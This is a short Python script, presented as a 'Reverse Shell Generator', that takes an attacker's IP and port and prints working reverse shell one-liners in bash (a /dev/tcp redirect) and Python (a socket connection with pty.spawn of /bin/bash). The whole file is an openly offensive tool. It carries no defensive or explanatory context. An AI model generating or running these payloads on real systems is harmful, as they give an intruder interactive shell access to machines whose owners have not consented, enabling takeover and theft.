# CREATED BY: RAMIZ UDDIN
import os, time

def tool_header(name):
    os.system("clear")
    print("\033[1;36m" + "="*45)
    print(f"      {name.upper()}")
    print("      CREATED BY: RAMIZ UDDIN")
    print("="*45 + "\033[0m")

# CREATED BY: RAMIZ UDDIN
def run():
    while True:
        print("\033[1;32m[*] ", end=""); print("\n\033[1;34m[*] Reverse Shell Generator\033[0m")
        ip = input("\nEnter your IP (or '0' to exit): ")
        if ip == '0': break
        port = input("Enter your Port: ")
        print("\033[1;32m[*] ", end=""); print(f"\n[ Bash ]\nbash -i >& /dev/tcp/{ip}/{port} 0>&1")
        print("\033[1;32m[*] ", end=""); print(f"\n[ Python ]\npython -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'")
        input("\n[Press Enter to Generate Another]")
if __name__ == "__main__": run()
